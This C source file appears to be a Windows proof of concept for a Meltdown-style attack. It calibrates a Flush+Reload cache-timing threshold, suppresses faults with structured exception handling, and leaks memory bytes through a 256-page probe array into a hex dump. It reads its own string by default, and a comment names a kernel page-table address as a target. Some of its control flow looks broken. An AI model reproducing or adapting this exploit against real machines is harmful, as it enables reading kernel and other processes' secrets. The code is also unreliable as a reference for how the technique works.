#define  _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <intrin.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <setjmp.h>
#include <signal.h>
#include <windows.h>
#include <stdint.h>


const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu."};
char disp[] = "................";
jmp_buf array_access_exception;
jmp_buf buf;
static char* _mem = NULL, * mem = NULL;
static int result;
volatile static size_t phys = 0;
size_t cache_miss_threshold;

char dup = ' ';
static inline void flush(void* p) {
	_mm_clflush(p);
}
static inline void maccess(void* p) {
	*(volatile size_t*)p;
}

static inline uint64_t rdtsc() {
	uint64_t a;
	uint32_t c;


	a = __rdtscp(&c);


	return a;
}
//static uint64_t rdtsc() {
//	uint64_t volatile a = 0, d = 0;
//	__asm {
//
//		RDTSCP
//		MOV DWORD PTR[d], EDX
//		MOV DWORD PTR[a], EAX
//
//	}
//	a = (d << 32) | a;
//	return a;
//}
//int add(int a, int b)
//{
//	__asm {
//		mov eax, DWORD PTR[a]
//		add eax, dword ptr b
//	}
//}
static int inline flush_reload(void* ptr) {
	uint64_t  start = 0, end = 0;

	start = rdtsc();
	maccess(ptr);
	end = rdtsc();

	flush(ptr);


	return (-1)*((end - start) - cache_miss_threshold);
}
static int inline packed_read(size_t addr) {
	 phys = addr;

	char res_stat[256];
	int i, j, r;
	for (i = 0; i < 256; i++)
		res_stat[i] = 0;


	for (i = 0; i < 10; i++) {
		r = read_buf();
		res_stat[r]++;
	}
	int max_v = 0, max_i = 0;

	for (i = 1; i < 256; i++) {
		if (res_stat[i] > max_v && res_stat[i] >= 1) {
			max_v = res_stat[i];
			max_i = i;
		}
	}
	return max_i;
}
//void volatile raise_exp()
//{
//	for (volatile int i = 0; i < 100000; i++)
//		;
//
//	longjmp(buf, 1);
//
//	return;
//}


int read_buf() {
	//phys = addr;
	PVOID h1;

	size_t retries = 1000;
	uint64_t start = 0, end = 0;
	int volatile i;


	while (retries--) {



		//MELTDOWN
		uint64_t volatile  byte;

		__try {
			byte = 0;
			byte = byte*byte;
			//__debugbreak();
			//if (byte == 0)
			RaiseException(0, 0, 0, 0);

	////		END MELTDOWN;
		}
		__except(1){
			goto jump;
		}
		byte = *(volatile uint8_t*)phys;
		byte = byte * 4096;
		//if (byte == 0) goto retry;

		*(volatile uint64_t*)(mem + byte);
	
	jump:
		byte = 0;
		int d=0;
		int maxd = -1;
		int sig = -1;
		for (i = 0; i < 256; i++) {
			d = flush_reload(mem + i * 4096);
			if (d>0) {
				if (i >= 1) {
					if (d > maxd) {
						maxd = d;
						sig = i;
					}
				}
			}
		}
		if (maxd > -1)
		{
			return sig;
		}

	}
	return 0;

}


static void detect_flush_reload_threshold() {
	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
	char dummy[1];
	size_t* ptr=dummy;
	uint64_t start = 0, end = 0;

	maccess(ptr);
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		reload_time += (end - start);
	}
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		flush(ptr);
		flush_reload_time += (end - start);
	}
	reload_time /= count;
	flush_reload_time /= count;

	printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
		flush_reload_time, reload_time);
	cache_miss_threshold = (flush_reload_time + reload_time ) / 2;
	printf("Flush+Reload threshold: %zd cycles\n",
		cache_miss_threshold);
}

void addchar(char a,int id) {
	if (a >= 33 && a <=126 ){
		disp[id] = a;
	}
	else {
		disp[id] = '.';
	}

}

int main() {

	int aX = 2;

	_mem = malloc(4096 * 256);

	mem = (char*)(((size_t)_mem ) );
//	memset(mem, 0x00, 4096 * 290);


	for (int j = 0; j < 256; j++) {
		flush(mem + j * 4096);
	}

	
	detect_flush_reload_threshold();
	int a = 5;
	int b = 4;


	int index=0;
	printf("Enter bytes to read: ");
	scanf("%i", &result);


	
	printf("Value is: \n%s \n",strings);
	printf("Result is: \n");
	unsigned char value='X';
	
	int indexer = 0;
	int xD = 0;
	//__debugbreak();
	//--------------
	//ADDRES TO READ
	//---------------
	//0xFFFFF6FB7DBED000 - PML4
	uint64_t addra = strings;
	printf("[%8X] ",(addra + index));
	while (1) {

		value = packed_read((addra + index)); 
		printf("%.2X ", value);
		fflush(stdout);
		addchar(value, indexer);
		index++;
		indexer++;
	
		if (indexer == 16) {
			printf(" | %s %c\n[%8X] ", disp, dup, (addra + index));
			indexer = 0;
			dup = ' ';
			xD++;
			if (index > result)
				break;
		}
	
	}
	system("pause");
	return 0;
}